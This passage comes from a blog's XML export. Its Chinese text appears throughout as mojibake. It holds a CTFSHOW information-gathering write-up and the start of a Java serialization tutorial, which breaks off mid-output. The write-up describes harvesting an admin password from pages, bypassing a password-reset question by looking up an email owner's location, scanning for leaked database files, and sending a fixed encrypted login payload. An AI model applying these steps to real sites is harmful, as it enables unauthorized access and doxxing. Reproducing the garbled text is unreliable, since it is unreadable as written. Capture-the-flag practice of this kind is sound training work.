¹æ®æç¤ºï¼ŒæŸ¥çœ‹ç½‘ç«™ï¼Œå¯»æ‰¾å¯†ç ï¼Œå‘ç°ç–‘ä¼¼å¯†ç çš„ä½ç½®</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12_02.png" alt=""></p><p>å°è¯•ç™»å½•ï¼Œç™»é™†æˆåŠŸï¼Œå¾—åˆ°flagï¼ˆadmin/372619038ï¼‰</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/12_03.png" alt=""></p><h1 id="web13"><a href="#web13" class="headerlink" title="web13()"></a>web13()</h1><p>æ ¹æ®æç¤ºï¼Œå¯»æ‰¾æŠ€æœ¯æ–‡æ¡£</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/13.png" alt=""></p><p>ç‚¹å‡»æŸ¥çœ‹ï¼Œå‘ç°åå°ç™»é™†åœ°å€ï¼Œç”¨æˆ·ååŠå¯†ç </p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/13_01.png" alt=""></p><p>ç›´æ¥ç™»å½•ï¼Œå°†<code>your-domain</code>æ¢æˆé¶åœºç¯å¢ƒipï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/13_02.png" alt=""></p><h1 id="web14"><a href="#web14" class="headerlink" title="web14()"></a>web14()</h1><p>æ ¹æ®æç¤ºï¼Œå‘ç°éœ€è¦å¯»æ‰¾<code>editor</code>ï¼Œå°è¯•è®¿é—®<code>/editor</code></p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/14.png" alt=""></p><p>å‘ç°åœ¨æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œèƒ½å¤ŸæŸ¥çœ‹ç›®å½•</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/14_01.png" alt=""></p><p>æŸ¥è¯¢ç›®å½•å‘ç°å­˜åœ¨æ–‡ä»¶<code>nothinghere/fl000g.txt</code>ï¼Œç›´æ¥è®¿é—®ï¼Œå¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/14_02.png" alt=""></p><h1 id="web15"><a href="#web15" class="headerlink" title="web15()"></a>web15()</h1><p>æç¤ºè¯´é‚®ç®±å¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œæˆ‘ä»¬å»å¯»æ‰¾ä¸€ä¸‹é‚®ç®±</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15.png" alt=""></p><p>è®¿é—®adminé¡µé¢</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15_01.png" alt=""></p><p>ç‚¹å‡»å¿˜è®°å¯†ç ï¼Œå‘ç°éœ€è¦æä¾›æ‰€åœ¨åœ°åŸå¸‚å</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15_02.png" alt=""></p><p>ç»“åˆä¸Šé¢çš„é‚®ç®±ï¼Œå‘ç°æ˜¯QQé‚®ç®±ï¼Œå»æœç´¢ä¸€ä¸‹å…¶QQï¼Œå‘ç°æ‰€åœ¨åœ°</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15_03.png" alt=""></p><p>æäº¤æ‰€åœ¨åœ°åï¼Œå‘ç°é‡ç½®å¯†ç ï¼Œç™»å½•ï¼Œè·å¾—flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15_04.png" alt=""></p><h1 id="web16-æ¢é’ˆ"><a href="#web16-æ¢é’ˆ" class="headerlink" title="web16( æ¢é’ˆ)"></a>web16( æ¢é’ˆ)</h1><p>æ ¹æ®æç¤ºå¯çŸ¥ï¼Œæœ¬é¢˜éœ€è¦ç”¨åˆ°æ¢é’ˆ</p><p>å°è¯•<code>tz.php</code>ï¼Œå‘ç°æ˜¯é›…é»‘æ¢é’ˆ</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/16.png" alt=""></p><p>æµè§ˆäº†ä¸€ä¸‹ï¼Œå‘ç°æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œè®¿é—®ä¸€ä¸‹phpinfo</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/16_01.png" alt="">æ‰¾åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/16_02.png" alt=""></p><h1 id="web18-js"><a href="#web18-js" class="headerlink" title="web18(js)"></a>web18(js)</h1><p>æ‰“å¼€åå‘ç°æ˜¯ä¸ªæ¸¸æˆï¼Œæç¤ºå‘Šè¯‰æˆ‘ä»¬éœ€è¦ç©åˆ°101åˆ†ï¼Œé‚£å¿…ä¸å¯èƒ½ç©æ¸¸æˆï¼Œç›´æ¥ä¸‹è½½æºç ï¼Œæ‰¾åˆ°scoreçš„å€¼ï¼Œå°†å…¶ä¿®æ”¹1000åˆ†</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/17.png" alt=""></p><p>ä½¿ä»£ç åœ¨æœ¬åœ°è·‘ï¼Œè¿‡å…³ï¼å¾—åˆ°æç¤º</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/17_01.png" alt=""></p><p>è®¿é—®<code>110.php</code>å¾—åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/17_02.png" alt=""></p><h1 id="web19"><a href="#web19" class="headerlink" title="web19()"></a>web19()</h1><p>æŸ¥çœ‹æºç ã€‚å‘ç°æç¤º</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/18_01.png" alt=""></p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/18.png" alt=""></p><p>å‘ç°è¿™æ˜¯ä¸€æ®µåŠ å¯†çš„è„šæœ¬ï¼Œä¼šå°†å¯†ç è¿›è¡ŒAESåŠ å¯†</p><p>åªéœ€è¦æŒ‰ç…§æ³¨é‡Šä¸­çš„ä»£ç ï¼Œpostä¼ å‚å³å¯</p><p><code>payload: username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/18_02.png" alt=""></p><h1 id="web20"><a href="#web20" class="headerlink" title="web20()"></a>web20()</h1><p>æ‰“å¼€åï¼Œå‘ç°æç¤º</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/19.png" alt=""></p><p>æ ¹æ®é¢˜ç›®æè¿°ï¼š<strong>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†</strong></p><p>å°è¯•æ‰«æç›®å½•</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/20_01.png" alt=""></p><p>æŸ¥çœ‹æ–‡ä»¶ï¼Œæœç´¢flagï¼Œæ‹¿åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/19_01.png" alt=""></p><h1 id="web17"><a href="#web17" class="headerlink" title="web17()"></a>web17()</h1><p>å‘ç°éœ€è¦å¯»æ‰¾sqlæ–‡ä»¶ï¼Œç›´æ¥æ‰«ç›®å½•</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/20.png" alt=""></p><p>å‘ç°sqlæ–‡ä»¶ï¼Œä¸‹è½½ï¼ŒæŸ¥çœ‹ï¼Œæ‹¿åˆ°flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/20_02.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> ä¿¡æ¯æœé›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–</title>
      <link href="/2023/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p> Javaåºåˆ—åŒ–æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ï¼›è€ŒJavaååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚</p><p>åºåˆ—åŒ–åˆ†ä¸ºä¸¤å¤§éƒ¨åˆ†ï¼šåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚åºåˆ—åŒ–æ˜¯è¿™ä¸ªè¿‡ç¨‹çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œå°†æ•°æ®åˆ†è§£æˆå­—èŠ‚æµï¼Œä»¥ä¾¿å­˜å‚¨åœ¨æ–‡ä»¶ä¸­æˆ–åœ¨ç½‘ç»œä¸Šä¼ è¾“ã€‚ååºåˆ—åŒ–å°±æ˜¯æ‰“å¼€å­—èŠ‚æµå¹¶é‡æ„å¯¹è±¡ã€‚å¯¹è±¡åºåˆ—åŒ–ä¸ä»…è¦å°†åŸºæœ¬æ•°æ®ç±»å‹è½¬æ¢æˆå­—èŠ‚è¡¨ç¤ºï¼Œæœ‰æ—¶è¿˜è¦æ¢å¤æ•°æ®ã€‚æ¢å¤æ•°æ®è¦æ±‚æœ‰æ¢å¤æ•°æ®çš„å¯¹è±¡å®ä¾‹</p><h2 id="ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p> æˆ‘ä»¬çŸ¥é“ï¼Œå½“ä¸¤ä¸ªè¿›ç¨‹è¿›è¡Œè¿œç¨‹é€šä¿¡æ—¶ï¼Œå¯ä»¥ç›¸äº’å‘é€å„ç§ç±»å‹çš„æ•°æ®ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼Œ è€Œè¿™äº›æ•°æ®éƒ½ä¼šä»¥äºŒè¿›åˆ¶åºåˆ—çš„å½¢å¼åœ¨ç½‘ç»œä¸Šä¼ é€ã€‚é‚£ä¹ˆå½“ä¸¤ä¸ªJavaè¿›ç¨‹è¿›è¡Œé€šä¿¡æ—¶ï¼Œèƒ½å¦å®ç°è¿›ç¨‹é—´çš„å¯¹è±¡ä¼ é€å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯ä»¥çš„ã€‚å¦‚ä½•åšåˆ°å‘¢ï¼Ÿè¿™å°±éœ€è¦Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–äº†ã€‚æ¢å¥è¯è¯´ï¼Œä¸€æ–¹é¢ï¼Œå‘é€æ–¹éœ€è¦æŠŠè¿™ä¸ªJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œç„¶ååœ¨ç½‘ç»œä¸Šä¼ é€ï¼›å¦ä¸€æ–¹é¢ï¼Œæ¥æ”¶æ–¹éœ€è¦ä»å­—èŠ‚åºåˆ—ä¸­æ¢å¤å‡ºJavaå¯¹è±¡</p><p>å½“æˆ‘ä»¬æ˜æ™°äº†ä¸ºä»€ä¹ˆéœ€è¦Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–åï¼Œæˆ‘ä»¬å¾ˆè‡ªç„¶åœ°ä¼šæƒ³Javaåºåˆ—åŒ–çš„å¥½å¤„ã€‚å…¶å¥½å¤„ä¸€æ˜¯å®ç°äº†æ•°æ®çš„æŒä¹…åŒ–ï¼Œé€šè¿‡åºåˆ—åŒ–å¯ä»¥æŠŠæ•°æ®æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼ˆé€šå¸¸å­˜æ”¾åœ¨æ–‡ä»¶é‡Œï¼‰ï¼ŒäºŒæ˜¯ï¼Œåˆ©ç”¨åºåˆ—åŒ–å®ç°è¿œç¨‹é€šä¿¡ï¼Œå³åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚</p><p>â‘  æƒ³æŠŠå†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…æ•°æ®åº“ä¸­æ—¶å€™ï¼›<br>â‘¡ æƒ³ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„æ—¶å€™ï¼›<br>â‘¢ æƒ³é€šè¿‡RMIä¼ è¾“å¯¹è±¡çš„æ—¶å€™</p><blockquote><p>ä¸€äº›åº”ç”¨åœºæ™¯ï¼Œæ¶‰åŠåˆ°å°†å¯¹è±¡è½¬åŒ–æˆäºŒè¿›åˆ¶ï¼Œåºåˆ—åŒ–ä¿è¯äº†èƒ½å¤ŸæˆåŠŸè¯»å–åˆ°ä¿å­˜çš„å¯¹è±¡ã€‚</p></blockquote><h2 id="å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®"><a href="#å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®" class="headerlink" title="å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®"></a>å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®</h2><ul><li><p>XML&amp;SOAP</p><p>XML æ˜¯ä¸€ç§å¸¸ç”¨çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®ï¼Œå…·æœ‰è·¨æœºå™¨ï¼Œè·¨è¯­è¨€ç­‰ä¼˜ç‚¹ï¼ŒSOAPï¼ˆSimple Object Access protocolï¼‰ æ˜¯ä¸€ç§è¢«å¹¿æ³›åº”ç”¨çš„ï¼ŒåŸºäº XML ä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®çš„ç»“æ„åŒ–æ¶ˆæ¯ä¼ é€’åè®®</p></li><li><p>JSONï¼ˆJavascript Object Notationï¼‰</p></li><li>Protobuf</li></ul><h1 id="åºåˆ—åŒ–å®ç°"><a href="#åºåˆ—åŒ–å®ç°" class="headerlink" title="åºåˆ—åŒ–å®ç°"></a>åºåˆ—åŒ–å®ç°</h1><p>åªæœ‰å®ç°äº†Serializableæˆ–è€…Externalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—ã€‚ï¼ˆä¸æ˜¯åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ï¼‰ </p><p><img src="/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java.png" alt=""></p><p><strong>Serializable æ¥å£</strong></p><p>æ˜¯ Java æä¾›çš„åºåˆ—åŒ–æ¥å£ï¼Œå®ƒæ˜¯ä¸€ä¸ªç©ºæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Serializable ç”¨æ¥æ ‡è¯†å½“å‰ç±»å¯ä»¥è¢« <code>ObjectOutputStream</code> åºåˆ—åŒ–ï¼Œä»¥åŠè¢« <code>ObjectInputStream</code> ååºåˆ—åŒ–</p><h2 id="Serializable-æ¥å£çš„åŸºæœ¬ä½¿ç”¨"><a href="#Serializable-æ¥å£çš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="Serializable æ¥å£çš„åŸºæœ¬ä½¿ç”¨"></a>Serializable æ¥å£çš„åŸºæœ¬ä½¿ç”¨</h2><p>é€šè¿‡ <code>ObjectOutputStream</code> å°†éœ€è¦åºåˆ—åŒ–æ•°æ®å†™å…¥åˆ°æµä¸­ï¼Œå› ä¸º Java IO æ˜¯ä¸€ç§è£…é¥°è€…æ¨¡å¼ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ <code>ObjectOutStream</code> åŒ…è£… <code>FileOutStream</code> å°†æ•°æ®å†™å…¥åˆ°æ–‡ä»¶ä¸­æˆ–è€…åŒ…è£… <code>ByteArrayOutStream</code> å°†æ•°æ®å†™å…¥åˆ°å†…å­˜ä¸­ã€‚åŒç†ï¼Œå¯ä»¥é€šè¿‡ <code>ObjectInputStream</code> å°†æ•°æ®ä»ç£ç›˜ <code>FileInputStream</code> æˆ–è€…å†…å­˜ <code>ByteArrayInputStream</code> è¯»å–å‡ºæ¥ç„¶åè½¬åŒ–ä¸ºæŒ‡å®šçš„å¯¹è±¡å³å¯</p><p><img src="/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java_01.png" alt=""></p><p><img src="/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java_02.png" alt=""></p><h2 id="Serializable-æ¥å£çš„ç‰¹ç‚¹"><a href="#Serializable-æ¥å£çš„ç‰¹ç‚¹" class="headerlink" title="Serializable æ¥å£çš„ç‰¹ç‚¹"></a>Serializable æ¥å£çš„ç‰¹ç‚¹</h2><p><strong>1. åºåˆ—åŒ–ç±»çš„å±æ€§æ²¡æœ‰å®ç° Serializable é‚£ä¹ˆåœ¨åºåˆ—åŒ–å°±ä¼šæŠ¥é”™</strong></p><blockquote><p>å…·ä½“å¯ä»¥è·Ÿè¿› ObjectOutputStream#writeObject() æºç æŸ¥çœ‹å…·ä½“åŸå› </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.io.NotSerializableException: com.example.seriable.Color</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Color ç±»ä¹Ÿæ˜¯éœ€è¦å®ç°åºåˆ—åŒ–æ¥å£çš„ã€‚</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">private</span> Color color;<span class="comment">//è¿™é‡Œå¦‚æœæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆåœ¨ Student å¯¹è±¡åºåˆ—åŒ–æ—¶å°†ä¼šæŠ¥é”™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå®ƒçš„çˆ¶ç±»å¦‚æœæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆå°†éœ€è¦æä¾›æ— å‚æ„é€ å‡½æ•°æ¥é‡æ–°åˆ›å»ºå¯¹è±¡</strong></p><p>Animal æ˜¯çˆ¶ç±»ï¼Œå®ƒæ²¡æœ‰å®ç° Serilizable æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">()</span> &#123;<span class="comment">//æ²¡æœ‰æ— å‚æ„é€ å°†ä¼šæŠ¥é”™</span></span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨ Animal æ— å‚æ„é€ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line"> </span><br><span class="line">            System.out.println(<span class="string">&quot;è°ƒç”¨ Animal æœ‰ color å‚æ•°çš„æ„é€ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Animal&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;color=&#x27;&quot;</span> + color + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlackCat æ˜¯ Animal çš„å­ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlackCat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨é»‘çŒ«çš„æ— å‚æ„é€ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">(String color, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(color);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨é»‘çŒ«æœ‰ color å‚æ•°çš„æ„é€ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BlackCat&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +<span class="built_in">super</span>.toString() +<span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SuperMain æµ‹è¯•ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuperMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./super.bin&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeAnimal();</span><br><span class="line">        deserializeAnimal();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BlackCat</span>(<span class="string">&quot;black&quot;</span>, <span class="string">&quot;æˆ‘æ˜¯é»‘çŒ«&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;åºåˆ—åŒ–å‰ï¼š&quot;</span>+black.toString());</span><br><span class="line">        System.out.println(<span class="string">&quot;=================å¼€å§‹åºåˆ—åŒ–================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(black);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=================å¼€å§‹ååºåˆ—åŒ–================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> (BlackCat) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(black);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨ Animal æœ‰ color å‚æ•°çš„æ„é€ </span><br><span class="line">    </span><br><span class="line">è°ƒç”¨é»‘çŒ«æœ‰ color å‚æ•°çš„æ„é€ </span><br><span class="line"> </span><br><span class="line">åºåˆ—åŒ–å‰ï¼šBlackCat&#123;name=<span class="string">&#x27;æˆ‘æ˜¯é»‘çŒ«&#x27;</span>Animal&#123;color=<span class="string">&#x27;black&#x27;</span>&#125;<span 